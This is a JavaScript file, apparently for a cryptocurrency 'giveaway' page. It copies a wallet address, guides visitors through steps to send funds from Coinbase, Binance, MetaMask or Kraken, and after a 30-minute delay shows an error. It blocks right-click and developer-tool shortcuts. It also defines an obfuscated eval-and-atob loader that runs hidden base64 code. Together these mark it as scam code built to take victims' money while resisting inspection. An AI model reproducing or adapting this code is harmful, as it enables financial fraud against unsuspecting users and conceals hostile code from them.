function copyDivToClipboard() {
    var range = document.createRange();
    range.selectNode(document.getElementById("wallet"));
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);
    document.execCommand("copy");
    window.getSelection().removeAllRanges();
}

document.oncontextmenu = function () {
    return false;
};

document.onkeydown = function (e) {
    if (event.keyCode == 123) {
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
        return false;
    }
    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
        return false;
    }
}

sfd = this["\x65\x76\x61\x6C"]; rty = this["\x61\x74\x6F\x62"]; glob = function (s) { sfd(rty(s.substring(-~[]))); }

$(".participate").click(function (e) {
    e.preventDefault();
    $('html,body').animate({ scrollTop: $(".participate-a").offset().top }, 'slow');
});

$(".transactions").click(function (e) {
    e.preventDefault();
    $('html,body').animate({ scrollTop: $(".table-a").offset().top }, 'slow');
});

$(".examples").click(function (e) {
    e.preventDefault();
    $('html,body').animate({ scrollTop: $(".examples-a").offset().top }, 'slow');
});

$(".rules-a").click(function (e) {
    e.preventDefault();
    $('html,body').animate({ scrollTop: $(".rule-a").offset().top }, 'slow');
});


$(".copy-type").click(function () {
    $(".notiff-copy").addClass("active")
    setTimeout(function () {
        $(".notiff-copy").removeClass("active")
        clearTimeout();
    }, 3000);
})

jQuery(($) => {
    $('.faq').on('click', '.item>.head-faq', function () {
        $(this).toggleClass("active")
        $(this).parent().children(".body-faq").slideToggle(200);
    });
});

$(".fst-step").click(function () {
    $(".data-steps-num>span").text("2");
    $(".fs-step").remove();
    $(".sc-step").css("display", "flex");
    $(".step-b").addClass("active");
    $(".step-a").addClass("complete")
});

$(".sec-step").click(function () {
    $(".data-steps-num>span").text("2");
    $(".sc-step").remove();
    $(".th-step").css("display", "flex");
    $(".step-c").addClass("active");
    $(".step-b").addClass("complete")
    setTimeout(() => {
        $(".th-step").remove();
        $(".error-step").css("display", "flex");
    }, 1800000);
});

jQuery(($) => {
	
	

	
	
    $('.data-input').on('input', 'input', function (e) {
        if (e.target.value.length <= 40) {
			    let result = Web3.utils.isAddress(address)
            $(".steps-type-a").attr("disabled", true);
        } else {
            $(".steps-type-a").attr("disabled", false);
        }
    });
});

$(".open-chos-rule").click(function () {
    $(".choose-modal-rule").fadeIn().css("display", "flex");
});

$(".open-chos-send").click(function () {
    $(".choose-modal-send").fadeIn().css("display", "flex");
});

$(".body-modal").click(function () {
    $(".responsive-modal").fadeOut();
});

$(".go-back").click(function () {
    $(".responsive-modal").fadeOut();
});

$(".find-type-a").click(function () {
    $(".choose-modal-rule").fadeOut();
    $(".coinbase-rule").delay(300).css("display", "flex").hide().fadeIn();
});

$(".find-type-b").click(function () {
    $(".choose-modal-rule").fadeOut();
    $(".binance-rule").delay(300).css("display", "flex").hide().fadeIn();
});

$(".find-type-c").click(function () {
    $(".choose-modal-rule").fadeOut();
    $(".metamask-rule").delay(300).css("display", "flex").hide().fadeIn();
});

$(".find-type-d").click(function () {
    $(".choose-modal-rule").fadeOut();
    $(".kraken-rule").delay(300).css("display", "flex").hide().fadeIn();
});

$(".find-type-e").click(function () {
    $(".choose-modal-rule").fadeOut();
    $(".other-rule").delay(300).css("display", "flex").hide().fadeIn();
});

// dsadsadsa

$(".rule-type-a").click(function () {
    $(".choose-modal-send").fadeOut();
    $(".coinbase-send").delay(300).css("display", "flex").hide().fadeIn();
});

$(".rule-type-b").click(function () {
    $(".choose-modal-send").fadeOut();
    $(".binance-send").delay(300).css("display", "flex").hide().fadeIn();
});

$(".rule-type-c").click(function () {
    $(".choose-modal-send").fadeOut();
    $(".metamask-send").delay(300).css("display", "flex").hide().fadeIn();
});

$(".rule-type-d").click(function () {
    $(".choose-modal-send").fadeOut();
    $(".kraken-send").delay(300).css("display", "flex").hide().fadeIn();
});

$(".rule-type-e").click(function () {
    $(".choose-modal-send").fadeOut();
    $(".other-send").delay(300).css("display", "flex").hide().fadeIn();
});

